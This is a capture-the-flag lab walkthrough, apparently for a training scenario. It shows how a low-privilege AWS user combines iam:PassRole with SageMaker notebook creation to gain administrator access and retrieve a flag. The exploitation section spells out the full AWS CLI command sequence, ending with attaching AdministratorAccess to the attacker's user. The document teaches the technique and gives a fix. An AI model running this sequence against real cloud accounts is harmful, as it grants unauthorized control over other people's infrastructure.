# Guided Walkthrough: Privilege Escalation via iam:PassRole + sagemaker:CreateNotebookInstance

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to SageMaker and create notebook instances. The attacker can create a SageMaker notebook instance with an administrative execution role, generate a presigned URL to access the Jupyter environment, and use the built-in terminal to execute AWS CLI commands with the elevated privileges of the notebook's execution role.

This technique is particularly effective because SageMaker notebook instances provide a full Jupyter environment with terminal access and pre-installed AWS CLI tools. Unlike some serverless services that require extracting temporary credentials, SageMaker notebooks allow direct interaction through a web-based terminal. The notebook instance automatically inherits the permissions of its execution role, enabling an attacker to execute arbitrary AWS commands with those privileges.

The attack was documented by Spencer Gietzen of Rhino Security Labs in 2019 as part of comprehensive research into AWS privilege escalation methods. It leverages the machine learning platform's legitimate need for elevated permissions, but exploits overly permissive IAM configurations that allow untrusted users to create their own notebook instances with privileged roles. This creates a persistent environment where an attacker can maintain elevated access for as long as the notebook instance remains running.

## The Challenge

You have obtained credentials for the IAM user `pl-prod-sagemaker-001-to-admin-starting-user`. This user has limited permissions — they cannot list IAM users or perform any administrative actions directly. Your goal is to reach the `pl-prod-sagemaker-001-to-admin-passable-role`, which carries `AdministratorAccess`.

The key observation: this user can pass IAM roles to SageMaker (`iam:PassRole`) and create notebook instances (`sagemaker:CreateNotebookInstance`). There is an admin role in the account that trusts `sagemaker.amazonaws.com` as a service principal. That combination is all you need.

## Reconnaissance

Start by confirming your identity and verifying that you don't already have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-sagemaker-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- good, confirms no admin yet
```

Now look for roles that trust SageMaker and carry elevated permissions:

```bash
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.Service, `sagemaker.amazonaws.com`)].RoleName'
```

You should see `pl-prod-sagemaker-001-to-admin-passable-role`. Check its attached policies to confirm it has `AdministratorAccess`:

```bash
aws iam list-attached-role-policies --role-name pl-prod-sagemaker-001-to-admin-passable-role
```

## Exploitation

With the target role identified, create a SageMaker notebook instance and pass the admin role as its execution role. You will need the full role ARN and your account ID:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-sagemaker-001-to-admin-passable-role"
NOTEBOOK_NAME="attacker-notebook-$(date +%s)"

aws sagemaker create-notebook-instance \
  --notebook-instance-name "$NOTEBOOK_NAME" \
  --instance-type ml.t3.medium \
  --role-arn "$ROLE_ARN"
```

SageMaker accepts the request because your user has `iam:PassRole` on the passable role and `sagemaker:CreateNotebookInstance`. The notebook is now provisioning. This takes 5-8 minutes — poll until you see `InService`:

```bash
aws sagemaker describe-notebook-instance \
  --notebook-instance-name "$NOTEBOOK_NAME" \
  --query 'NotebookInstanceStatus' --output text
```

Once the status is `InService`, generate a presigned URL to access the Jupyter environment without needing console login:

```bash
aws sagemaker create-presigned-notebook-instance-url \
  --notebook-instance-name "$NOTEBOOK_NAME" \
  --query 'AuthorizedUrl' --output text
```

Open the presigned URL in your browser. You will land directly in the Jupyter interface. Click **New** -> **Terminal** in the top-right corner. You now have a terminal session running as the notebook's execution role — the `pl-prod-sagemaker-001-to-admin-passable-role` with `AdministratorAccess`.

From the Jupyter terminal, grant the admin policy directly to your starting user to establish persistent access:

```bash
aws iam attach-user-policy \
  --user-name pl-prod-sagemaker-001-to-admin-starting-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Wait approximately 15 seconds for IAM policy propagation.

## Verification

Back in your original terminal session, confirm that the starting user now has administrator access:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-sagemaker-001-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3 --output table
# Success -- full IAM enumeration now works
```

## Capture the Flag

With `AdministratorAccess` now attached to the starting user, you have `ssm:GetParameter` on all parameters in the account. The scenario flag is stored in SSM Parameter Store under the path `/pathfinding-labs/flags/sagemaker-001-to-admin`. Retrieve it using your newly-elevated starting user credentials:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/sagemaker-001-to-admin \
  --query 'Parameter.Value' \
  --output text
```

A successful response returns the flag value, confirming you have completed the scenario.

## What Happened

You exploited a classic `iam:PassRole` privilege escalation path. The starting user had two permissions that together form a complete escalation: the ability to pass a privileged role to a service (`iam:PassRole`), and the ability to create a resource that accepts that service's execution role (`sagemaker:CreateNotebookInstance`). Neither permission alone is sufficient, but together they let you spin up an environment that runs with admin credentials — and SageMaker's Jupyter terminal gave you direct interactive access to those credentials.

In real environments this pattern appears when ML teams are granted broad SageMaker access without careful scoping of which roles they can pass. Any user who can both call `iam:PassRole` and create a service resource with an execution role has a potential privilege escalation path, regardless of whether the service is SageMaker, Lambda, ECS, Glue, or dozens of others. The fix is always the same: scope `iam:PassRole` with `iam:PassedToService` conditions and ensure only appropriately-privileged users can create notebook instances.
